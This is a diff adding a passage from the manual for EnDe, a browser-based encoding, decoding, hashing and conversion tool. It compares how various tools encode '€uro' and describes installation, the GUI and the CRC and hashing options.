@@ -1,0 +1,2636 @@
+	
+	
+NAME
+	
+	EnDe - Encoder, Decoder, Converter, Calculator, TU WAS DU WILLST .. [1]
+		for various codings used in the wild wide web
+	
+	
+SYNOPSIS
+	
+	Click & Enjoy
+	
+	
+QUICK START
+	
+	Type, click & go.
+	After installation (see below) or opening the proper URL,  EnDe can be
+	used right away without reading the whole manual here. Most fields and
+	buttons and so on come with a brief description.
+	
+	Key in your text in the proper  input field,  select any of the listed
+	actions in the selection box on the left, and ready you go.
+	
+	If you feel that you need to know more, just click on [?] button which
+	should jump to the proper description in the manual.
+	
+	Or check the  EXAMPLES, HINTS  below to get some examples right away.
+	
+	If you want to perform more sophisticated actions, please read the
+	  BEFORE DECODING  section below first.
+	
+	There is a small FAQ in http:EnDe.man.html?EnDe.FAQ.txt .
+	
+	EnDe does not make any HTTP requests, anything is done in the browser.
+	Ooops wrong, the manual pages and loading external files are done with
+	a HTTP request, though.
+	
+	
+INTRODUCTION
+	
+	What is EnDe useful for, what differs from other similar tools?
+	
+	The answer to this often asked question is  manifold,  so let's try to
+	explain with examples.
+	
+    US-ASCII EXAMPLE
+	
+	Using the string  'Euro' for some codings and hashes:
+	
++-
+|	   CRC-32       base64     urlUTF-8             MD5(hex)
+|	------------+-----------+-----------+---------------------------------
+|	1fb0ba15     RXVybw==    Euro        3E823FAC7473E42888932C7761C224FC
++-
+	
+	Trying these codings and hashes in various tools  should always return
+	the same result. Not very surprising, it's expected to do so.
+	
+    COMMON EXAMPLE
+	
+	Now let's replace the  'E' by '€' which then is '€uro'.
+	If all characters are Unicode (UCS-2) the result is as follows:
+	
++-
+|	   CRC-32       base64     urlUTF-8             MD5(hex)
+|	------------+-----------+-----------+---------------------------------
+|	b4c7b4a7     IKx1cm8=   %e2%82%acuro 08c1d37a0b3394da278b77116cc4e615
++-
+	
+	Trying these codings and hashes  in various tools  most likely returns
+	different result depending on the tool. See following examples.
+	
+    OTHER TOOLS
+	
+	Here is a small list of tools and their results (as for 2010/2011):
+	
++-
+|	 tool        base64       urlUTF-8             MD5(hex)
+|	----------+-----------+-------------+---------------------------------
+|	  [99]      IKx1cm8=    %e2%82%acuro   08c1d37a0b3394da278b77116cc4e615
+|	  [31]                                 916f2296b42011db9c5e780b02bd3d5f
+|	  [32]      rHVybw==    %E2%82%ACuro
+|	  [33]      4oKsdXJv                   36F9D3BB76279BE66536E2D4E250C7AD
+|	  [34]      4oKsdXJv    %E2%82%ACuro
+|	  [35]      4oKsdXJv    %E2%82%ACuro   36f9d3bb76279be66536e2d4e250c7ad
+|	  [36]      4oKsdXJv    %E2%82%ACuro   36f9d3bb76279be66536e2d4e250c7ad
+|	  [37]      rHVybw==    %u20ACuro
+|	  [38]      gHVybw==                   203b6da413075e767581e4be9354295b
+<!--
+|	  [39]      4oKsdXJv                   36f9d3bb76279be66536e2d4e250c7ad
+-->
+|	  [40] undefinedHVybw== %u20ACuro      08c1d37a0b3394da278b77116cc4e615
+|	  [41]      HVybw==     %u20ACuro      08c1d37a0b3394da278b77116cc4e615
+|	  [42]                                 08c1d37a0b3394da278b77116cc4e615
+|	  [43]                                 3e823fac7473e42888932c7761c224fc
+|	  [44]      4oKsdXJv    %E2%82%AC%75%72%6F   36f9d3bb76279be66536e2d4e250c7ad
+|	  [45]      4oKsdXJv                   24bd7d579377f38cafec01ee4c8ab976
+|	  [46]      gHVybw==                    
+|	  [49]      HVybw==     %u20ACuro      08c1d37a0b3394da278b77116cc4e615
+|	  [51]      4oKsdXJv                   36F9D3BB76279BE66536E2D4E250C7AD
+|	  [52]      rHVybw==
+|	  [62]      gHVybw==    %80uro         203B6DA413075E767581E4BE9354295B
+|	  [63]      rHVybw==    %ac%75%72%6f   08c1d37a0b3394da278b77116cc4e615
+|	  [64]      23Vybw==    %E2%82%ACuro   226D11B3E7FFC35CCE5C815378A78323
+|	  [65]      gHVybw==    %E2%82%ACuro   203B6DA413075E767581E4BE9354295B
+|	  [66]      P3Vybw==    %E2%82%ACuro   59DA12B00E4E700E1C5E4B1157FB595B
+|	  [67]      P3Vybw==    %E2%82%ACuro   36F9D3BB76279BE66536E2D4E250C7AD
+|	  [68]      4oKsdXJv    %E2%82%ACuro   36F9D3BB76279BE66536E2D4E250C7AD
+|	  [71]      gHVyb3==    %80uro         203b6da413075e767581e4be9354295b
+|	  [72]      gHVybw==    €uro           203b6da413075e767581e4be9354295b
+|	  [73]      P3Vybw==    %E2%82%ACuro   59DA12B00E4E700E1C5E4B1157FB595B
+|	  [74]      4oKsdXJv    %e2%82%acuro
+|	  [75]                                 
+|	  [81]                                 
+|	  [88]      4oKsdXJvCg==               42dfe0927d2ea6daced8c118bbb8002b
++-
+	
+	This are 11 different base64 and 10 different MD5 results for 31 tools.
+	Differences in URL-UTF-8 encodings not counted.
+	
+<!--
+[32] was ist realurlenc? %20ac%75%72%6f%3c
+[33] http://www.zorc.breitbandkatze.de/crc.html  CRC-32 1FB0BA15
+[35] http://www.prox42.de/produkt/convert/demo.php CRC-32 3035337571 oder  6393ebb4
+[36] http://www.webutils.pl/Ascii85 CRC-32 b4eb9363
+[72] http://www.nosec.org/web/files/Encoder.exe CRC-32 5E23A421
+-->
+	The results are different. We'll have even more fun when copying (copy
+	& paste) from one tool to another.
+	
+	What is wrong?
+	There is nothing wrong and it's not a bug in those tools.
+	Just a different interpretation of the given input data. In particular
+	the charset of the input data.
+	
+	Online Browser Tools
+	[32]  (2010) http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php 
+	[33]  (2010) http://textop.us/ 
+	[34]  (2010) http://h4k.in/encoding/index.php 
+	[35]  (2010) http://www.prox42.de/produkt/convert/demo.php 
+	[36]  (2010) http://www.webutils.pl/Ascii85 
+	[37]  (2010) http://ostermiller.org/calc/encode.html 
+	[38]  (2010) http://www.php-einfach.de/base64_generator.php 
+	[39]  (2010) http://gtools.org/tool/base64-encode-decode/ 
+	[31]  (2012) http://rogeriopvl.com/hashr/api2/hash hashr 1.1
+	Firefox Browser Add-Ons
+	[40]  (2010) https://addons.mozilla.org/firefox/addon/3899 HackBar (Mac OSX)
+	[41]  (2010) https://addons.mozilla.org/firefox/addon/3899 HackBar (Windows)
+	[42]  (2010) https://addons.mozilla.org/firefox/addon/3208 Fire Encrypter (Mac OSX)
+	[43]  (2010) https://addons.mozilla.org/firefox/addon/3208 Fire Encrypter (Windows)
+	[48]  (2010) https://addons.mozilla.org/firefox/addon/baseconvertor/ BaseCorner Converter (Linux)
+	[49]  (2012) https://addons.mozilla.org/en-US/firefox/addon/cryptofox/ CryptoFox 2.2
+	[31]  (2012) https://addons.mozilla.org/en-US/firefox/addon/hashr/ hashr 1.1
+	Chrome Browser Extensions
+	[44]  (2010) https://chrome.google.com/webstore/detail/iihoicgdaflndmojghlcnfgjkpkhpgee?hl=en-US JavaScript Toolbox (Linux)
+	[45]  (2010) https://chrome.google.com/extensions/detail/gncnbkghencmkfgeepfaonmegemakcol d3coder (Linux)
+	[46]  (2010) https://chrome.google.com/webstore/detail/ochhcobhdebiaimobmlnjogeggcgafgd?hl=en-US# Advanced Encoder/Decode (Linux)
+	Opera Widgets (Mac OSX)
+	[51]  (2010) http://widgets.opera.com/category/web-developer/ FastHash, rHash 0.2
+	[52]  (2010) http://widgets.opera.com/category/web-developer/ Text Encoder
+	Java Tools
+	[62]  (2010) http:// @stake WebProxy (Linux, Mac OSX, Windows)
+	[63]  (2011) http://portswigger.net burp 1.3
+	[64]  (2011) http://www.owasp.org/index.php/Category:OWASP_JBroFuzz 2.x (Mac OSX)
+	[65]  (2011) http://www.owasp.org/index.php/Category:OWASP_JBroFuzz 2.x (Windows)
+	[66]  (2010) http://www.owasp.org/index.php/Category:OWASP_JBroFuzz 1.8 (Windows)
+	[67]  (2011) https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project ZAP 1.3.4 (Linux)
+	[68]  (2012) https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project ZAP 1.4.0 (Linux)
+	Windows Binaries
+	[71]  (2011) https://www.bindshell.net/tools/coder/ Coder
+	[72]  (2011) http://www.nosec.org/web/files/Encoder.exe NOSEC Encoder
+	[73]  (2010) http://parosproxy.org/ Paros Build-in Tool Encode/Hash
+	[74]  (2010) http://www.fiddler2.com/fiddler/ Fiddler
+	[75]  (2010) http://code.google.com/webslayer/ WebSlayer
+	Other Tools
+	[81]  (2010) http://www.owasp.org/index.php/Category:OWASP_Webslayer_Project WebSlayer
+	Unix shell (ash, bash, csh, ...) Intel CPU (little endian)
+	[88]  (2011) echo €uro | md5sum
+	EnDe
+	[99]  (2011) EnDe
+	
+    DECODE BASE64
+	
+	We got various different results for encoding. Now let's try to simply
+	decode base64 but omit the trailing  '=' filling characters (which are
+	not necessary for base64 decoding correctly):
+	
++-
+|	 tool        base64       decoded
+|	----------+-----------+-------------
+|	  [99]      IKx1cm8     €uro
+|	  [32]      rHVybw      <error>
+|	  [33]      4oKsdXJv    €uro
+|	  [34]      4oKsdXJv    €uro
+|	  [39]      4oKsdXJv    €ur
+|	  [40] undefinedHVybw   
+|	  [41]      HVybw       
+|	  [48]      IKx1cm8=    �ro
+|	  [48]      IKx1cm8     
+|	  [49]      HVybw==     \��
+|	  [51]      4oKsdXJv    
+|	  [52]      rHVybw       ¬urbw
+|	  [62]      gHVybw      €uror
+|	  [63]      rHVybw       ¬urbw
+|	  [64]      23Vybw      €ur
+|	  [65]      gHVybw      €ur
+|	  [66]      P3Vybw      --nothing--
+|	  [67]      P3Vybw      --nothing--
+|	  [71]      gHVyb3      €uro
+|	  [72]      gHVyb3      --nothing--
+|	  [73]      P3Vybw      --nothing--
+|	  [74]      4oKsdXJv    €uro
+|	  [74]      4oKsdXJvMQ  Error: Ungültige Länge für einen Base-64-Zeichenarray.
+|	  [75]      rHVybw      
+|	  [81]      IKx1cm8     �uro
+|	  [81]      rHVybw==    �uro
++-
+	Unfortunatelly some of the tools even fail to decode correctly without
+	removing the trailing '='. This is not mentioned in above table.
+	Please make your own opinion if it's a bug or feature.
+	
+	This makes 11 different results for 21 tools.
+	
+	Finally, this introduction  was compiled in 2010 and 2011  where these
+	problems still exist (however, EnDe development began in 2006).
+	
+    BROWSER TOOL - EnDe
+	
+	While having so much trouble to get the right encoding,  EnDe was born
+	so that (hopfully) a reliable coding, hashing etc. exists in browsers.
+	EnDe does not claim to do it the right way,  but it at least tells you
+	how the input data is used (always Unicode, except told otherwise).
+	
+	As explained below, EnDe's main purpose is for HTTP/HTML processing so
+	that we don't have such media discontinuity anymore.
+	
+    TARGET AUDIENCE
+	
+	EnDe can be used for various duties, the audience may be:
+	* developers building secure applications
+	* penetration testers (see also [6], [7])
+	* analysing malicious web applications
+	* anyone interested in codings
+	
+	
+DESCRIPTION
+	
+	EnDe  is a library with a collection of functions for various codings,
+	encodings, decodings and conversions.
+	
+	The objectives are mainly driven by the requirements for functionality
+	in HTTP/HTML systems.  However, it's not limited to that, tell us your
+	story ...
+	
+    IT SHOULD ..
+	
+	* .. be possible to be used in a straight forward way
+	* .. have mainly just one click for each functionality
+	* .. be possible to nest functions for continous use
+	* .. be usable anywhere at any time
+	
+    IT IS NOT ..
+	
+	* .. a replacement of all/most of the tools mentioned at  LINKS  below
+	* .. a perfect implementation (hey, you're engaded to fix all existing
+	     bugs you find, add new features, improve usability, etc. :-)
+	* .. a secure browser application
+	* .. test for RegEx syntax (lint or alike)
+	* .. converter for RegEx from or to another syntax (flavour)
+	
+    FURTHER DESCRIPTION
+	
+	The description of  EnDe's library functions  can be found at the  API  
+	section below. The browser  interface to that API is described at  GUI  
+	section below, and you find the  QUICK START  above for lazy people.
+	
+	
+CONVENTIONS, TEXT MARKUP
+	
+	Following text markups are used herein:
+	* [button] button  is a button in the GUI
+	* "some text" is either a label in the GUI or a filename
+	* 'some text' is a literal text
+	* multiple lines of code, which is literal text too, look like:
++-
+|	  first line
+|	  second line
+|	  ..
++-
+	* a local link (same domain): http:other.html
+	* external link (other domain): http://other.tld/page.html 
+	* link pointing to an anchor in this help text:  QUICK START  
+	* a numbered list:
+	  # item 1
+	  # item 2
+	
+	* a unnumbered list like this line
+	* [ < ] jump to previous location in the help page (browser view only)
+	* [ ^ ] jump to top of this help page (browser view only)
+	
+	
+SECURITY
+	
+	EnDe was designed with no security in mind as it works without calling
+	external URLs. It does not use JavaScript's 'eval()' or 'setTimeout()'
+	except for:
+	* nested function execution; in GUI only
+	* "Beautify -> .toSource()"; in GUI only
+	* "Beautify -> .JSReg" which uses 'eval()' internal, in GUI only
+	* [eval] action (button) in Functions window; GUI only
+<!-- 03/2011 no longer used
+	* Dean Edward's Packer [5] for compressed JavaScript files;
+	  EnDe online version only
+     12/2010 no more .json files
+	* "create menu" from .json files;  GUI OPTIONS  section in GUI only
+-->
+	
+	This pertains to the GUI only, while the API does not use  'eval()'.
+	
+	Use EnDe at your own risk.
+	
+	
+INSTALLATION
+	
+	Installation is quiet simple:  copy the files from your  http:EnDe.tgz
+	download to any directory and point your browser to  http:index.html .
+	Ready you go.
+	
+    INSTALLATION for a WEB SERVER
+	
+	Copy the files from your download to the directory of your web server.
+	It's recommended that all files are delivered by the web server  using
+	'Charset-Set: UTF-8', though it should work with other charsets also.
+	
+	In Apache you either have to change "httpd.conf" and restart apache or
+	use a ".htaccess" file in your directory as follows:
++-
+|	< Location "/EnDe/">
+|	    AddDefaultCharset        utf-8
+|	    AddType text/css;charset=utf-8  .css
+|	    AddType text/html;charset=utf-8 .html
+|	    AddType text/plain;charset=utf-8 .txt
+|	    AddType text/javascript;charset=utf-8 .js
+|	< /Location>
++-
+	
+	(depending on the location of this ".htaccess" the '< Location>' scope
+	is obviously obvious:)
+	
+    BROWSER CONFIGURATION
+	
+	The browser should be configured with  'Charset-Set: UTF-8'.   Even it
+	would work with common settings too, lesser problems are expected.
+	
+    JAVASCRIPT VERSIONS
+	
+	All JavaScript code relies on  ECMA-262  standard (ECMAScript v3).
+	
+    RECOMMENDATION
+	
+	For good security reasons  most browsers restrict access to files from
+	the same domain (Same Origin Policy).  If files other than those being
+	part of the GUI should be read (for example with the "Load Local File"
+	function), then it's recommended that EnDe is installed locally and is
+	accessed local as file like:  file:///path/to/index.html .
+	Less problems are expected ... but see  KNOWN GUI PROBLEMS  also.
+	
+	Following browsers are known to work flawless:
+		Webkit, Mozilla 1.7.x, Firefox 2.x, Firefox 3.x .. 11.x
+	For anything else the  BROWSER QUIRKS  need to be consulted.
+	
+	
+BEFORE DECODING
+	
+	While all encodings work flawless, decoding data to its previous state
+	(decode data) needs some pre-conditions. That's why some decodings may
+	return unexpcted results at first glance.
+	
+	As decoding needs some care,  it is recommended  to start with decoded
+	data first,  encode it and then decode it,  which should result in its
+	primitive state (that's how the testing is implemented).
+	
+	If unknown data should be decoded, and the result contains errors then
+	it might be usefull to remove some charaters at the beginning and then
+	start the decoding again. Also try to decode just parts -hint: use the
+	"selection" switch in  GUI OPTIONS.  
+	
+	Often data looks like  simple encoded data, but is a mix of encodings,
+	or partially encoded only, or multiple encoded or ...
+	In such cases the  "Fuzzy decoding" actions may help, or one of the
+	"User functions" actions, see  FUNCTIONS.  
+	
+	I. g. humans are much better skilled in deciding to use which decoding
+	for which part of the data. "Fuzzy decoding" and  "User functions" are
+	just an attempt to manage some common cases  and should not considered
+	perfect.
+	
+	
+GUI
+	
+	"EnDe.html" is the  GUI  to the 5 groups of functions (called  TOOLS  
+	herein). Each tool provides its own set of functions (called  ACTIONS  
+	herein) which accept some parameters. Each tool has its own section in
+	the GUI.
+	
+	Global  functionalities and parameters for all tools  are available in
+	the  GUI OPTIONS  and  API OPTIONS  section preceding the five  TOOLS  
+	sections.
+	
+	All in all, EnDe consist of following sections:
+	* Trace (optional)
+	* Test  (optional)
+	* GUI Options
+	* API Options
+	* Character
+	* En- / Decoding
+	* IP Converter
+	* Timestamp Converter
+	* RegEx - Regular Expressions
+	
+	The tools, which are the last 5 sections, are described below.
+	
+	Additional to these sections, there exist some inset windows which are
+	used to configure more general functionality. The inset windows are:
+	* Functions
+	* Replace Map
+	* Browser Quirks
+	
+	Each will be activated with a button in the  GUI OPTIONS  section.
+	
+	The look & feel of the GUI depends on the browser.  Unfortunately some
+	browsers behave strange. The GUI can be tweaked to work around some of
+	these browser quirks. See  BROWSER QUIRKS  for more details.
+	
+    GENERAL DESIGN HINTS
+	
+	All buttons, checkboxes and select menus will show a brief description
+	when the mouse is over the element (using the tags 'title' attribute).
+	If the description is  missing, mainly for  'SELECT' tags, then please
+	refer to  KNOWN PROBLEMS  for more details.
+	
+	Any select menu item calls an action which changes something somewhere.
+	Same applies to all (light-blue) coloured buttons.
+	Whereas all buttons in standard browser style open a new window and do
+	not change other fields, usually.
+	
+	Keep in mind that the menus of type SELECT  are configured to call the
+	assigned action when an item receives a click or mouse-up event.
+	No additional click is required (click & go).
+	
+	Due to various problems in the behaviour of standard HTML SELECT menus
+	(the traditional popup menus in one line and the pulldown arrow right)
+	such menus may not work as expected. See the  KNOWN PROBLEMS  for more
+	details.
+	
+	For customizing the GUI, see  CUSTOMIZE GUI  below.
+	
+    COMMON FUNCTIONS
+	
+	All tools have some actions in common.
+	
+	On top in the tool's header line:
+          [-] button      to fold the tool's GUI
+          [x] button      to close the tool's GUI (for inset windows)
+          [?] button      to show the description (what you see here)
+	
+	On bottom of most tools (mainly below the textarea input field):
+          [clear] menu    various actions, see  TEXT MENU  below
+          [guess] button
+          [guess] menu    to call a guessing action for the tool
+          [Window ..]     to show the current data in a new window (rendered)
+          [Scratchpad ..] to append the current data to the Scratchpad window
+	
+	When using the windows ( [Window ..] , [Scratchpad ..] button) you can
+	preserve various results for later use. The texts can simply be copy &
+	pasted from these windows. The [Scratchpad ..] window is writable.
+	
+	Some tools provide 3 tab-like buttons to switched text representations
+	in their textarea input fields:
+	
+	 [Text] tab
+		Shows text as keyed in or pasted or generated.  For characters
+		outside the (integer) range 30 .. 127  the displayed character
+		depends on the  browser's implementation and/or the  browser's
+		configuration.
+	 [Hex] tab
+		Displays the corresponding hex value for each character.
+		The left part of the display shows the hex values  for each of
+		the characters.  The right part shows the character itself  (a
+		dot  '.' for none printable US-ASCII characters).
+		Right and left part are separated by a  '|' (bar).
+		Hex values are one byte usually. Unicode characters greater to
+		'0xff' are written as 2 bytes without a space in between. This
+		allows to destinguish 1-byte characters from 2-byte characters
+		(1-byte: 0 .. 255, 2-byte: 256 .. 65335).
+		Hint:  This can also be used to convert 2 bytes to one Unicode
+		character,  for example: change  '20 ac' to  '20ac' to get the
+		Unicode character  '&#8364' ,  the '€' currency sign.
+		NOTE:  only changes in the left (hex) part can be converted to
+		the [Text] representation.
+		See also "Special -> od-x style" decoding.
+	 [parsed] tab
+		Shows text beautified for better (human) reading.
+		`parsed' means different things in different tools.
+		In the En-/Decoding section for example it replaces all '&' by
+		newlines (\n), and all '=' by tabs. In the Functions window it
+		tries to ident the function parameters and the nested function
+		calls. For Regular Expressions it tries to ident on braces.
+	
+	The representations can be switched from  [Text], [Hex] or [parsed] to
+	to [Hex], [parsed] or [Text] or vice versa.
+	It's recommended that [Text] is selected when using actions.
+	
+	As described above most tools also provide the  [clear]  pulldown menu
+	with actions for special text manipulations/conversions. These actions
+	apply to the corresponding (above) textarea input field. Each of these
+	action will be explained with a help text provided by each menu entry.
+	For more detaisl see the  TEXT MENU  below.
+	NOTE: the results of these actions are not reversible.
+	
+    MODE
+	
+	EnDe's tool actions operate in one of two modes: "direct" or "nested",
+	see [Functions] button in  GUI OPTIONS  (or Quick Bar).
+	However, currently only en-/decoding supports these modes.
+	
+	Direct Mode
+	=======================================
+	In direct mode all actions are executed immediately, encoded data will
+	be stored in the Decoding textarea  and decoded data will be stored in
+	the Encoding textarea. This is the default.
+	
+	Nested Mode (Functions inset window)
+	=======================================
+	The  FUNCTIONS  inset window will be shown  and all actions clicked in
+	Encoding or Decoding  are stored as  a JavaScript function call in the
+	window's textarea box. More functions can be found in the select menus
+	at bottom of the window. Additonally any valid JavaScript can be added
+	in the texarea field as needed.
+	
+	This code will then be execuded on demand, just like any other action,
+	by the buttons found in "show results in ..".
+	It's called "nested" because each result of an action is used as input
+	to the next action, this way actions can be chained together.
+	
+	The generated JavaScript code will simply be stuffed to  'eval()'.
+	Any valid JavaScript can be added to the generated code as needed. See
+	  EXAMPLES, HINTS  below also.
+	
+	For a detailed description of the Functions inset window see  FUNCTIONS  
+	below.
+	
+    ACTIONS
+	
+	Actions in the context of EnDe are functions for encoding, decoding or
+	some kind of conversion of any data (most commonly character strings).
+	
+	Available actions are mainly the select menu or buttons to the left of
+	the input fields. For a description see the help text provided by each
+	seletct (option) entry or button.
+	
+	Most actions are mapped to a unique function of the  API.  
+	Though, some actions are implemented in the GUI only.
+	
+    TOOLS
+	
+	All tools have a set of actions,  mainly grouped in the select menu to
+	the left. This menu comes with a description itself for each entry, so
+	no further description for the actions will be found here.
+	
+	Most tools also have some special  text manipulation functions (mainly
+	at the bottom of each tool).  The detailed description for them can be
+	found at  COMMON FUNCTIONS  above and  TEXT MENU  below.
+	
+	All tools - their actions in particular -  use settings and parameters
+	from  API OPTIONS  (see description below).
+	NOTE: (currently 2011) only the  En- / Decoder  use these settigs.
+	
+	The tools are described below with the  DETAILS **  headers.
+	
+    DETAILS Character
+	
+	Simple conversion  of a single character into  binary, octal, decimal,
+	hex, UTF and Unicode representation.
+	It also contains the  [Special Unicode] menu, see  UNICODE MENU  below
+	for details.
+	
+    DETAILS En-/Decoding
+	
+	Encoded texts will be shown in the Decoding textarea and vice versa.
+	There is no  detailed description of each action, the help text should
+	be self-explanating.
+	
+	There're following options, which manipulate the given data in the en-
+	or decoding textarea before they are passed to the selected action:
+	
+	"0x00"
+		Add null byte (NUL) to end of text.
+	"0x0a"
+		Add newline (NL) character to end of text.
+	"0x0d"
+		Add carriage return (CR) character to end of text.
+	"0x0a"
+		Add newline (NL) character to end of text.
+	"0x1a"
+		Add end-of-text (SUB) character to end of text.
+	
+	NOTE:  These characters are added to the text only  before processing.
+	They are not added to the textarea field.
+	
+	For practical usage of these options, see  EXAMPLES, HINTS  below.
+	
+	Following are common things and those which differ for some actions of
+	the en-/decoding tool.
+	
+	For a description of the "Prefix", "Suffix", "Delimiter", "uppercase",
+	"size", "Key", etc. see  API OPTIONS  below.
+	
+	The en-/decoding actions are grouped as follows:
+	
+	 "URI/URL"
+		All these actions do not use "Prefix", "Suffix" or "Delimiter"
+		but "uppercase" and "size".
+		Exception is "Punycode" and "IDN" see below.
+		NOTE: the "fullwidth (UTF-8)" encoding generates  3-byte UTF-8
+		characters which most (all?) browsers cannot display.  This is
+		not a bug (in the browser or EnDe) but a general limitation as
+		JavaScript only supports Unicode (UTF-16).
+	 "HTML-Entity"
+		All these actions do not use "Prefix", "Suffix" or "Delimiter"
+		but "uppercase" and "size".
+	 "Unicode/UTF"
+		All these actions do not use "Prefix", "Suffix" or "Delimiter"
+		but "uppercase" and "size".
+	 "Base-N"
+		Various base-N encodings (namely base-64).
+		All these actions do not use "Prefix", "Suffix" and "Key"  but
+		"wrap" and "mode".  Where "wrap"  will inserts a newline after
+		specified number of characters. "mode" (decoding only) behaves
+		behaves as follows:
+		* strict  - allows only valid characters and  requires padding
+		* lazy    - allows only valid characters with optional padding
+		* verbose - ignores invalid characters  (only valid characters
+			    will be decoded), padding is optional. This can be
+			    used for `impedance mismatch' decodings.
+	<!-- empty line required to keep format; bug in EnDe.man.html -->	
+	
+	 "Coding"
+		Some special codings, see  LIMITATIONS  below also.
+		This group also contains  "Caesar",  "Rot13" and "RotN"  which
+		are encryptions by definition.  But it is common practice that
+		they are treated as codings as the key is well known or simple
+		to detect.
+	 "Straight"
+		Some of these codings use the "size" value.
+	 "Numbers"
+		Simple number conversions.
+		NOTE: huge numbers may be displayed using exponents.
+	 "Characters"
+		Does not use any of the options.
+	 "En-/Decryption"
+		All these function use the value from "Key" as cipher.
+	 "Hash/Checksum"
+		These actions exist in "Encoding" only, obviously.
+		"RIPEMD-160" can also be found here (even it's not a real hash
+		function), it uses the value from "Key" as cipher and requires
+		a value in "Iteration".
+		For more details see  Hashing (MD4, MD5, etc.)  below
+		For CRC functions see description below.
+	 "Escape Characters"
+		These en-, decodings don't use any  API OPTIONS.  
+	 "JavaScript built-in"
+		These actions simply call the browser's built-in functions, so
+		the results may be different depending on the browser.
+		NOTE: some functions are not implemented by all browsers.
+	 "Special"
+		These en-, decodings don't use any  API OPTIONS.  
+        	"Viewstate"   try to parse/fold ASP.NET 1.0 or 2.0 viewstate
+		For  Viewstate the  API OPTION  "mode" (decoding only) behaves
+		as follows:
+		- strict  - all values are XML-escaped using:
+			'EnDe.EN.dispatch("escXML", ...)'
+		- lazy    - all values are printed as is
+		"xdump style"  decode space seperated hex values.
+		Allowed formats:
+			left side with hex values separated by delimiter right
+			side any character:
+			     'de,ad,beef | string'
+			left side  with hex values separated by spaces,  right
+			and left side are separated by '|':
+			     'de ad beef | string'
+			or right side may be missing, but not the separators:
+			     'de ad beef |'
+			Separator is any character which is not a hex (a-f0-9)
+			character. Example:
+			     'de ad beef string'
+			     'de ad beef  $'
+			all 4 lines decode the hex values 'de' 'ad' and 'beef'
+		"od -x style"  decode space seperated 2- or 4-byte hex values.
+		Allowed formats same as for "xdump style", but:
+			The first field and all following spaces are ignored.
+			Example: prefix=x
+			     '0000 de ad | string'
+			     '00100 beef | string'
+			decodes the hex values 'de' 'ad' and 'beef'.
+	 "Fuzzy decoding"
+		These actions exist in "Decoding" only.
+		For details see  Fuzzy Decoding  below.
+	 "Symbols"
+		Some function to convert to `symbols'. The symbols are written
+		as ASCII-art,  hence most of these  conversion functions exist
+		as encoding only. For some fucntions see the [esoteric] button
+		in  GUI OPTIONS  below.
+		See [User API Options] menu also for symbol representations.
+	 "Beautify"
+		Just some function to make the URL's search part or JavaScript
+		code human readable.
+		Following actions print the result in their own window and not
+		in the En-/Decoding textarea:
+		"JSDecode"  to make obfuscated JavaScript human readable.
+		"JSFormat"  to make compact JSON or JavaScript human readable.
+		While "JsDecode" is more usefull for JavaScript, "JSFormat" is
+		better for JSON data (in the author's opinion:).
+		"JSReg"  parse given source with JSReg sandbox.
+		"show as image"  try to display data as image.
+	
+          [guess] menu
+		This button contains a menu consisting of above menu groups.
+		Selecting such a submenu  allows guessing  for just that group
+		of actions.
+	
+	Punycode, IDNA Punycode
+	=======================================
+	Punycode and IDNA Punycode is usefull for hostnames (FQDN) only.  Each
+	part of the FQDN needs to be en-/decoded seperately.  That is what the
+	standard "Punicode" and "(xn--)IDN" actions do.
+	Some systems provide the `libidn' with the corresponding `idn' program
+	which adds the '-' delimiter as trailing character if no character was
+	encoded. To support this behaviour the  "Punicode (libidn compatible)"
+	[User API Options] was added, which passes "Suffix" for this delimiter
+	to the actions.
+	NOTE that some versions of  `libidn' are buggy; they may bail out with
+	an error or even crash when decoding some strings. Also note that some
+	versions always encode the complete string instead of splitting at the
+	'.' (dot). Such bugs are not implemented in EnDe ;-)
+	
+	CRC
+	=======================================
+	There are various implementations of different CRC - Cyclic Redundancy
+	Codes/Checks - algorithms to be found in the wild.  It is difficult to
+	explain all the variants and some of them are even confusing.
+	For a detailed description see [8].
+	
+	The basic idea of these algorithms are:
+	* there is an initial vector
+	* compute the checksum of the given data using ploynomial arithmetic
+	* an output mask may be added to the result.
+	
+	Furthermore all the used data may undergo some  transformations called
+	`reflection' [*]  like:
+	* reflect the data per byte
+	* reflect the data as a whole
+	* reflect each byte of the data and then byte-vice as a whole.
+	
+	These reflections can be performed on:
+	* the inital vector
+	* the ploynom (which is in fact the same as using different values)
+	* the given data
+	* the mask for the result
+	* the result itself (before finally XOR'ed).
+	
+	The algorithms can be done by coding loops for processing the data, or
+	by using  prebuild transformation tables  instead of processing, which
+	then results in better performance.
+	And as this is not enough confusion, some people mix the inital vector
+	and the ploynomial which results in 2 modes of the algorithm called:
+	* direct
+	* non-direct
+	
+	[*] reflect  - swapping all of its bits around the central point
+	
+	EnDe uses the coded algorithm and table driven algorithms depending on
+	the selected CRC type. Only a few types are supported directly.
+	The full support for algorithmic and table driven calculations is only
+	available in the  API  , while the  GUI  is limited to the most common
+	CRC functions used in pratice.
+	The  API  can be used directly for example in "nested" mode by writing
+	the corresponding function calls there (details see "EnDeFunc.txt").
+	However, there is a workaround in the GUI to supports some parameters:
+	 "Prefix"
+		the value for the initial vector (hex digits prefixed '0x')
+	 "Suffix"
+		the value for the output mask (hex digits prefixed '0x')
+	 "Key/Cipher"
+		the value for the polinomial (hex digits prefixed '0x')
+		or a constant for using predifined tables:
+		- 'ARCtab'
+		- 'MODtab'
+		- 'PPPtab'
+<!-- NOT YET IMPLEMENTED
+		- 'C32tab'
+	 Delimiter
+		following fixed key can be used:
+		- 'REFIN'
+		- 'REFOUT'
+		- 'REVERSE/REFLECT'
+  -->
+	NOTE: the "values are hex" checkbox is not observed.
+	
+	Some  common used combinations  are defined in the  [User API Options]
+	menu and can be used with the "CRC (user)" action.  They are useful as
+	example if special CRC types should be crafted.
+	The avaialable encoding actions "CRC-8", "CRC-16", "CRC-16(CCITT)" and
+	"CRC-32" do not use these parameters (as they are already hardcoded).
+	NOTE also that these actions return the result hex-encoded without any
+	prefix, suffix or delimiter. If the raw (integer) values are required,
+	the "nested" mode must be used.
+	
+	The GUI to the CRC functions may (needs to:) be improved in future.
+	
+	Hashing (MD4, MD5, etc.)
+	=======================================
+	Most of the hashing functions are awailable to return  their result in
+	"raw", "hex" or "base64" format.
+	The GUI to these functions may be improved in future  so that there is
+	only one action and the mode ("raw", "hex" or "base64") is selected by
+	an option elsewhere.
+	
+	Fuzzy Decoding
+	=======================================
+	All en-/decoding functions process each charcater or string pattern in
+	the given string. If there are different encodings used in the string,
